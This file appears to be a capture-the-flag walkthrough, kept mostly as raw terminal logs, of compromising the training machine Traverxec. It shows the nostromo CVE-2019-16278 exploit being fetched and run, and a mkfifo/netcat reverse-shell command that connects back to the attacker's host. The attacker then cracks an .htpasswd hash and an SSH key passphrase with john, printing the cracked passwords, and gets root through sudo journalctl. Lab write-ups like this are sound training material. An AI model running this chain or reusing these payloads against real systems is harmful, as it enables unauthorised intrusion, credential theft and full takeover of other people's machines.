@@ -1,0 +1,603 @@
+RECON
+root@kali:~/htb/traverxec# nmap -sC -sV -p- -vv -oA  full 10.10.10.165
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-12-10 21:17 GMT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 21:17
+Completed NSE at 21:17, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 21:17
+Completed NSE at 21:17, 0.00s elapsed
+Initiating Ping Scan at 21:17
+Scanning 10.10.10.165 [4 ports]
+Completed Ping Scan at 21:17, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:17
+Completed Parallel DNS resolution of 1 host. at 21:17, 0.04s elapsed
+Initiating SYN Stealth Scan at 21:17
+Scanning 10.10.10.165 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.165
+Discovered open port 80/tcp on 10.10.10.165
+SYN Stealth Scan Timing: About 19.56% done; ETC: 21:20 (0:02:08 remaining)
+SYN Stealth Scan Timing: About 36.68% done; ETC: 21:20 (0:01:45 remaining)
+SYN Stealth Scan Timing: About 59.43% done; ETC: 21:20 (0:01:02 remaining)
+Completed SYN Stealth Scan at 21:20, 128.31s elapsed (65535 total ports)
+Initiating Service scan at 21:20
+Scanning 2 services on 10.10.10.165
+Completed Service scan at 21:20, 6.10s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.165.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 21:20
+Completed NSE at 21:20, 1.10s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 21:20
+Completed NSE at 21:20, 0.00s elapsed
+Nmap scan report for 10.10.10.165
+Host is up, received echo-reply ttl 63 (0.034s latency).
+Scanned at 2020-12-10 21:17:54 GMT for 136s
+Not shown: 65533 filtered ports
+Reason: 65533 no-responses
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
+|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
+80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+SEARCH FOR NOSTROMO EXPLOITS
+root@kali:~/htb/traverxec# searchsploit nostromo
+---------------------------------------------------- ----------------------------------------
+ Exploit Title                                      |  Path
+                                                    | (/usr/share/exploitdb/)
+---------------------------------------------------- ----------------------------------------
+nostromo nhttpd 1.9.3 - Directory Traversal Remote  | exploits/linux/remote/35466.sh
+---------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+
+GRAB SCRIPT FROM RED TEAM SITE
+https://www.redteam-pentesting.de/en/advisories/rt-sa-2011-001/-nostromo-nhttpd-directory-traversal-leading-to-arbitrary-command-execution
+
+OR
+https://www.exploit-db.com/exploits/47837
+
+root@kali:~/htb/traverxec# wget https://www.exploit-db.com/raw/47837
+
+root@kali:~/htb/traverxec# ls -l
+total 32
+-rwxr-xr-x 1 root root 1024 Dec 10 21:42 35466.sh
+-rw-r--r-- 1 root root 1833 Dec 10 22:30 47837
+-rw-r--r-- 1 root root  456 Dec 10 21:20 full.gnmap
+-rw-r--r-- 1 root root 1785 Dec 10 21:20 full.nmap
+-rw-r--r-- 1 root root 5424 Dec 10 21:20 full.xml
+-rwxr--r-- 1 root root  639 Dec 10 22:28 nhttpd.sh
+-rwxr-xr-x 1 root root  661 Dec 10 21:49 traverxec.sh
+root@kali:~/htb/traverxec# vim 47837 
+root@kali:~/htb/traverxec# cp 47837 traverxec.py
+root@kali:~/htb/traverxec# chmod 744 traverxec.py
+
+COMMENT OUT LINE 10
+root@kali:~/htb/traverxec# vim traverxec.py 
+#cve2019_16278.py
+
+RUN SCRIPT TO TEST RCE
+root@kali:~/htb/traverxec# python traverxec.py 
+
+
+                                        _____-2019-16278
+        _____  _______    ______   _____\    \   
+   _____\    \_\      |  |      | /    / |    |  
+  /     /|     ||     /  /     /|/    /  /___/|  
+ /     / /____/||\    \  \    |/|    |__ |___|/  
+|     | |____|/ \ \    \ |    | |       \        
+|     |  _____   \|     \|    | |     __/ __     
+|\     \|\    \   |\         /| |\    \  /  \    
+| \_____\|    |   | \_______/ | | \____\/    |   
+| |     /____/|    \ |     | /  | |    |____/|   
+ \|_____|    ||     \|_____|/    \|____|   | |   
+        |____|/                        |___|/    
+
+
+
+
+
+Usage: cve2019-16278.py <Target_IP> <Target_Port> <Command>
+root@kali:~/htb/traverxec# python traverxec.py 10.10.10.165 80 id
+
+
+                                        _____-2019-16278
+        _____  _______    ______   _____\    \   
+   _____\    \_\      |  |      | /    / |    |  
+  /     /|     ||     /  /     /|/    /  /___/|  
+ /     / /____/||\    \  \    |/|    |__ |___|/  
+|     | |____|/ \ \    \ |    | |       \        
+|     |  _____   \|     \|    | |     __/ __     
+|\     \|\    \   |\         /| |\    \  /  \    
+| \_____\|    |   | \_______/ | | \____\/    |   
+| |     /____/|    \ |     | /  | |    |____/|   
+ \|_____|    ||     \|_____|/    \|____|   | |   
+        |____|/                        |___|/    
+
+
+
+
+HTTP/1.1 200 OK
+Date: Thu, 10 Dec 2020 22:38:34 GMT
+Server: nostromo 1.9.6
+Connection: close
+
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+RUN SCRIPT WITH NETCAT TO GET REVERSE SHELL
+root@kali:~/htb/traverxec# vim traverxec.py 
+root@kali:~/htb/traverxec# python traverxec.py 10.10.10.165 80 "mkfifo /tmp/p; nc 10.10.14.26 1234 0</tmp/p | /bin/sh > /tmp/p 2>&1;rm /tmp/p"
+
+
+                                        _____-2019-16278
+        _____  _______    ______   _____\    \   
+   _____\    \_\      |  |      | /    / |    |  
+  /     /|     ||     /  /     /|/    /  /___/|  
+ /     / /____/||\    \  \    |/|    |__ |___|/  
+|     | |____|/ \ \    \ |    | |       \        
+|     |  _____   \|     \|    | |     __/ __     
+|\     \|\    \   |\         /| |\    \  /  \    
+| \_____\|    |   | \_______/ | | \____\/    |   
+| |     /____/|    \ |     | /  | |    |____/|   
+ \|_____|    ||     \|_____|/    \|____|   | |   
+        |____|/                        |___|/    
+
+
+
+root@kali:~/htb/traverxec# nc -lvp 123
+listening on [any] 123 ...
+^C
+root@kali:~/htb/traverxec# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.165: inverse host lookup failed: Unknown host
+connect to [10.10.14.26] from (UNKNOWN) [10.10.10.165] 53942
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+hostname
+traverxec
+pwd
+/usr/bin
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@traverxec:/usr/bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@traverxec:/usr/bin$ ls -l /home
+ls -l /home
+total 4
+drwx--x--x 5 david david 4096 Oct 25  2019 david
+www-data@traverxec:/usr/bin$ cat /home/david/user.txt
+cat /home/david/user.txt
+cat: /home/david/user.txt: Permission denied
+www-data@traverxec:/usr/bin$ 
+
+
+UPLOAD LINUX SMART ENUMERATION SCRIPT
+root@kali:~/htb/traverxec# cp /root/linux-smart-enumeration/lse.sh .
+root@kali:~/htb/traverxec# python -m SimpleHTTPServer 80
+
+TRANSFER TO TRAVERXEC
+www-data@traverxec:/usr/bin$ cd /tmp
+www-data@traverxec:/tmp$ ls
+www-data@traverxec:/tmp$ wget 10.10.14.26/lse.sh  
+
+MAKE EXECUTABLE
+www-data@traverxec:/tmp$ chmod +x lse.sh
+chmod +x lse.sh
+www-data@traverxec:/tmp$ ls -al
+ls -al
+total 80
+drwxrwxrwt 10 root     root      4096 Dec 10 20:42 .
+drwxr-xr-x 18 root     root      4096 Oct 25  2019 ..
+drwxrwxrwt  2 root     root      4096 Dec 10 16:21 .ICE-unix
+drwxrwxrwt  2 root     root      4096 Dec 10 16:21 .Test-unix
+drwxrwxrwt  2 root     root      4096 Dec 10 16:21 .X11-unix
+drwxrwxrwt  2 root     root      4096 Dec 10 16:21 .XIM-unix
+drwxrwxrwt  2 root     root      4096 Dec 10 16:21 .font-unix
+-rwxr-xr-x  1 www-data www-data 40579 Dec 10 20:36 lse.sh
+prw-r--r--  1 www-data www-data     0 Dec 10 20:43 p
+drwx------  3 root     root      4096 Dec 10 16:21 systemd-private-d89fa21726a74ab3a1573870e21bf9b3-systemd-timesyncd.service-cSRLjV
+drwx------  2 root     root      4096 Dec 10 16:21 vmware-root
+drwx------  2 root     root      4096 Dec 10 16:21 vmware-root_622-2689275054
+www-data@traverxec:/tmp$ ./lse.sh
+./lse.sh
+---
+If you know the current user password, write it here to check sudo privileges: 
+
+---
+
+ LSE Version: 3.0
+
+        User: www-data
+     User ID: 33
+    Password: none
+        Home: /var/www
+        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+       umask: 0022
+
+    Hostname: traverxec
+       Linux: 4.19.0-6-amd64
+Distribution: Debian GNU/Linux 10 (buster)
+Architecture: x86_64
+
+==================================================================( users )=====
+[i] usr000 Current user groups............................................. yes!
+[*] usr010 Is current user in an administrative group?..................... nope
+[*] usr020 Are there other users in an administrative groups?.............. nope
+[*] usr030 Other users with shell.......................................... yes!
+[i] usr040 Environment information......................................... skip
+[i] usr050 Groups for other users.......................................... skip
+[i] usr060 Other users..................................................... skip
+[*] usr070 PATH variables defined inside /etc.............................. yes!
+[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
+===================================================================( sudo )=====
+[!] sud000 Can we sudo without a password?................................. nope
+[!] sud010 Can we list sudo commands without a password?................... nope
+[*] sud040 Can we read sudoers files?...................................... nope
+[*] sud050 Do we know if any other users used sudo?........................ nope
+============================================================( file system )=====
+[*] fst000 Writable files outside user's home.............................. yes!
+[*] fst010 Binaries with setuid bit........................................ yes!
+[!] fst020 Uncommon setuid binaries........................................ yes!
+---
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+---
+[!] fst030 Can we write to any setuid binary?.............................. nope
+[*] fst040 Binaries with setgid bit........................................ skip
+[!] fst050 Uncommon setgid binaries........................................ skip
+[!] fst060 Can we write to any setgid binary?.............................. skip
+[*] fst070 Can we read /root?.............................................. nope
+[*] fst080 Can we read subdirectories under /home?......................... nope
+[*] fst090 SSH files in home directories................................... nope
+[*] fst100 Useful binaries................................................. yes!
+[*] fst110 Other interesting files in home directories..................... nope
+[!] fst120 Are there any credentials in fstab/mtab?........................ nope
+[*] fst130 Does 'www-data' have mail?...................................... nope
+[!] fst140 Can we access other users mail?................................. nope
+[*] fst150 Looking for GIT/SVN repositories................................ nope
+[!] fst160 Can we write to critical files?................................. nope
+[!] fst170 Can we write to critical directories?........................... nope
+[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
+[!] fst190 Can we read any backup?......................................... nope
+[!] fst200 Are there possible credentials in any shell history file?....... nope
+[i] fst500 Files owned by user 'www-data'.................................. skip
+[i] fst510 SSH files anywhere.............................................. skip
+[i] fst520 Check hosts.equiv file and its contents......................... skip
+[i] fst530 List NFS server shares.......................................... skip
+[i] fst540 Dump fstab file................................................. skip
+=================================================================( system )=====
+[i] sys000 Who is logged in................................................ skip
+[i] sys010 Last logged in users............................................ skip
+[!] sys020 Does the /etc/passwd have hashes?............................... nope
+[!] sys022 Does the /etc/group have hashes?................................ nope
+[!] sys030 Can we read shadow files?....................................... nope
+[*] sys040 Check for other superuser accounts.............................. nope
+[*] sys050 Can root user log in via SSH?................................... nope
+[i] sys060 List available shells........................................... skip
+[i] sys070 System umask in /etc/login.defs................................. skip
+[i] sys080 System password policies in /etc/login.defs..................... skip
+===============================================================( security )=====
+[*] sec000 Is SELinux present?............................................. nope
+[*] sec010 List files with capabilities.................................... yes!
+[!] sec020 Can we write to a binary with caps?............................. nope
+[!] sec030 Do we have all caps in any binary?.............................. nope
+[*] sec040 Users with associated capabilities.............................. nope
+[!] sec050 Does current user have capabilities?............................ skip
+========================================================( recurrent tasks )=====
+[*] ret000 User crontab.................................................... nope
+[!] ret010 Cron tasks writable by user..................................... nope
+[*] ret020 Cron jobs....................................................... yes!
+[*] ret030 Can we read user crontabs....................................... nope
+[*] ret040 Can we list other user cron tasks?.............................. nope
+[*] ret050 Can we write to any paths present in cron jobs.................. yes!
+[!] ret060 Can we write to executable paths present in cron jobs........... nope
+[i] ret400 Cron files...................................................... skip
+[*] ret500 User systemd timers............................................. nope
+[!] ret510 Can we write in any system timer?............................... nope
+[i] ret900 Systemd timers.................................................. skip
+================================================================( network )=====
+[*] net000 Services listening only on localhost............................ nope
+[!] net010 Can we sniff traffic with tcpdump?.............................. nope
+[i] net500 NIC and IP information.......................................... skip
+[i] net510 Routing table................................................... skip
+[i] net520 ARP table....................................................... skip
+[i] net530 Namerservers.................................................... skip
+[i] net540 Systemd Nameservers............................................. skip
+[i] net550 Listening TCP................................................... skip
+[i] net560 Listening UDP................................................... skip
+===============================================================( services )=====
+[!] srv000 Can we write in service files?.................................. nope
+[!] srv010 Can we write in binaries executed by services?.................. nope
+[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
+[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
+[*] srv040 Upstart files not belonging to root............................. nope
+[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
+[i] srv400 Contents of /etc/inetd.conf..................................... skip
+[i] srv410 Contents of /etc/xinetd.conf.................................... skip
+[i] srv420 List /etc/xinetd.d if used...................................... skip
+[i] srv430 List /etc/init.d/ permissions................................... skip
+[i] srv440 List /etc/rc.d/init.d permissions............................... skip
+[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
+[i] srv460 List /etc/init/ permissions..................................... skip
+[!] srv500 Can we write in systemd service files?.......................... nope
+[!] srv510 Can we write in binaries executed by systemd services?.......... nope
+[*] srv520 Systemd files not belonging to root............................. nope
+[i] srv900 Systemd config files permissions................................ skip
+===============================================================( software )=====
+[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
+[!] sof010 Can we connect to MySQL as root without password?............... nope
+[!] sof015 Are there credentials in mysql_history file?.................... nope
+[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
+[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
+[*] sof030 Installed apache modules........................................ nope
+[!] sof040 Found any .htpasswd files?...................................... yes!
+---
+/var/nostromo/conf/.htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+---
+[!] sof050 Are there private keys in ssh-agent?............................ nope
+[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
+[!] sof070 Can we write to a ssh-agent socket?............................. nope
+[!] sof080 Can we write to a gpg-agent socket?............................. nope
+[i] sof500 Sudo version.................................................... skip
+[i] sof510 MySQL version................................................... skip
+[i] sof520 Postgres version................................................ skip
+[i] sof530 Apache version.................................................. skip
+=============================================================( containers )=====
+[*] ctn000 Are we in a docker container?................................... nope
+[*] ctn010 Is docker available?............................................ nope
+[!] ctn020 Is the user a member of the 'docker' group?..................... nope
+[*] ctn200 Are we in a lxc container?...................................... nope
+[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
+==============================================================( processes )=====
+[i] pro000 Waiting for the process monitor to finish....................... yes!
+[i] pro001 Retrieving process binaries..................................... yes!
+[i] pro002 Retrieving process users........................................ yes!
+[!] pro010 Can we write in any process binary?............................. nope
+[*] pro020 Processes running with root permissions......................... yes!
+[*] pro030 Processes running by non-root users with shell.................. nope
+[i] pro500 Running processes............................................... skip
+[i] pro510 Running process binaries and permissions........................ skip
+
+==================================( FINISHED )==================================
+
+FIND HTPASSWD FILE FOR USER DAVID
+===============================================================( software )=====
+[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
+[!] sof010 Can we connect to MySQL as root without password?............... nope
+[!] sof015 Are there credentials in mysql_history file?.................... nope
+[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
+[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
+[*] sof030 Installed apache modules........................................ nope
+[!] sof040 Found any .htpasswd files?...................................... yes!
+---
+/var/nostromo/conf/.htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+COPY PASSWORD TO FILE ON KALI AND CRACK WITH JOHN
+root@kali:~/htb/traverxec# john htpasswd.txt -w /usr/share/wordlists/rockyou.txt
+Nowonly4me (david)
+
+CANNOT SSH OR SUDO AS USER DAVID SO REVIEW PATH WITH HTPASSWD
+www-data@traverxec:/tmp$ ls -alHR /var/nostromo/conf/
+ls -alHR /var/nostromo/conf/
+/var/nostromo/conf/:
+total 20
+drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
+drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
+-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
+-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
+-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
+
+REVIEW THE NHTTPD CONF FILE
+www-data@traverxec:/tmp$ cat /var/nostromo/conf/nhttpd.conf
+cat /var/nostromo/conf/nhttpd.conf
+# MAIN [MANDATORY]
+
+servername		traverxec.htb
+serverlisten		*
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+
+# LOGS [OPTIONAL]
+
+logpid			logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user			www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons			/var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs		/home
+homedirs_public		public_www
+
+BASED ON THE HOMEDIRS SETTING CHECK PUBLIC WWW FOLDER
+www-data@traverxec:/tmp$ ls -alHR /home/david/public_www
+ls -alHR /home/david/public_www
+/home/david/public_www:
+total 16
+drwxr-xr-x 3 david david 4096 Oct 25  2019 .
+drwx--x--x 5 david david 4096 Oct 25  2019 ..
+-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
+drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
+
+/home/david/public_www/protected-file-area:
+total 16
+drwxr-xr-x 2 david david 4096 Oct 25  2019 .
+drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
+-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
+-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
+
+
+DAVID HOME FOLDER AVAILBLE OVER HTTP
+http://10.10.10.165/~david/
+
+LOGIN TO DOWNLOAD BACKUP SSH FILE
+http://10.10.10.165/~david/protected-file-area/
+Index of /david/public_www/protected-file-area/
+Type	Filename	Last Modified	Size
+icon	backup-ssh-identity-files.tgz	Fri, 25 Oct 2019 17:02:59 EDT	1915
+
+UNZIP BACKUP FILE AND LOGIN OVER SSH WITH ID RSA KEY FILE
+root@kali:~/htb/traverxec# ls -l home/david/.ssh/
+total 12
+-rw-r--r-- 1 root root  397 Oct 25  2019 authorized_keys
+-rw------- 1 root root 1766 Oct 25  2019 id_rsa
+-rw-r--r-- 1 root root  397 Oct 25  2019 id_rsa.pub
+root@kali:~/htb/traverxec# ssh -i home/david/.ssh/id_rsa david@10.10.10.165
+Enter passphrase for key 'home/david/.ssh/id_rsa': 
+Enter passphrase for key 'home/david/.ssh/id_rsa': 
+david@10.10.10.165's password: 
+Permission denied, please try again.
+david@10.10.10.165's password: 
+Permission denied, please try again.
+david@10.10.10.165's password: 
+david@10.10.10.165: Permission denied (publickey,password).
+
+USE SSH2JOHN TO CONVERT TO FORMAT FOR CRACKING WITH JOHN ID_RSA 
+root@kali:~/htb/traverxec# ssh2john home/david/.ssh/id_rsa > id_rsa.hash 
+
+CRACK HASH WITH JOHN
+root@kali:~/htb/traverxec# john id_rsa.hash -w /usr/share/wordlists/rockyou.txt
+hunter (id_rsa)
+
+LOGIN AGAIN OVER SSH WITH ID RSA PASSWORD
+root@kali:~/htb/traverxec# ssh -i home/david/.ssh/id_rsa david@10.10.10.165
+Enter passphrase for key 'home/david/.ssh/id_rsa': 
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+david@traverxec:~$ id
+uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+david@traverxec:~$ pwd
+/home/david
+
+GET USER FLAG
+david@traverxec:~$ cat user.txt
+###############################
+
+PRIVESC TO ROOT
+
+REVIEW CONTENTS IN DAVID HOME DIRECTORY
+david@traverxec:~$ ls -alHR
+.:
+total 36
+drwx--x--x 5 david david 4096 Oct 25  2019 .
+drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
+lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
+-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
+-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
+drwx------ 2 david david 4096 Oct 25  2019 .ssh
+drwx------ 2 david david 4096 Oct 25  2019 bin
+drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
+-r--r----- 1 root  david   33 Oct 25  2019 user.txt
+
+./.ssh:
+total 20
+drwx------ 2 david david 4096 Oct 25  2019 .
+drwx--x--x 5 david david 4096 Oct 25  2019 ..
+-rw-r--r-- 1 david david  397 Oct 25  2019 authorized_keys
+-rw------- 1 david david 1766 Oct 25  2019 id_rsa
+-rw-r--r-- 1 david david  397 Oct 25  2019 id_rsa.pub
+
+./bin:
+total 16
+drwx------ 2 david david 4096 Oct 25  2019 .
+drwx--x--x 5 david david 4096 Oct 25  2019 ..
+-r-------- 1 david david  802 Oct 25  2019 server-stats.head
+-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
+
+REVIEW FILES SERVER STATS
+david@traverxec:~$ cat bin/server-stats.sh 
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+ 
+david@traverxec:~$ cat bin/server-stats.head 
+                                                                          .----.
+                                                              .---------. | == |
+   Webserver Statistics and Data                              |.-"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::\"    "
+                                                            /:::=======:::\
+                                                        jgs '"""""""""""""' 
+
+
+POTENTIAL TO ELEVATE TO ROOT WITH SUDO JOURNALCTL COMMAND
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+
+REVIEW THE JOURNALCTL USING GTFOBINS
+https://gtfobins.github.io/gtfobins/journalctl/
+Sudo
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+    sudo journalctl
+    !/bin/sh
+
+
+
+RUN COMMAND WITHOUT THE PIPE COMMAND AND ESCALATE WITH INVOKING OF /BIN/SH
+david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Thu 2020-12-10 16:21:50 EST, end at Thu 2020-12-10 21:43:12 EST. --
+Dec 10 16:21:52 traverxec nhttpd[438]: max. file descriptors = 1040 (cur) / 1040 (max)
+Dec 10 16:21:52 traverxec systemd[1]: Started nostromo nhttpd server.
+Dec 10 20:35:34 traverxec sudo[838]: pam_unix(sudo:auth): authentication failure; logname= ui
+Dec 10 20:35:45 traverxec sudo[838]: www-data : command not allowed ; TTY=pts/0 ; PWD=/usr/bi
+Dec 10 20:44:15 traverxec crontab[1733]: (www-data) LIST (www-data)
+!/bin/sh
+
+GET ROOT SHELL
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# pwd
+/home/david
+# hostname
+traverxec
+# /sbin/ifconfig
+
+GET ROOT FLAG
+# cat /root/root.txt
+####################################
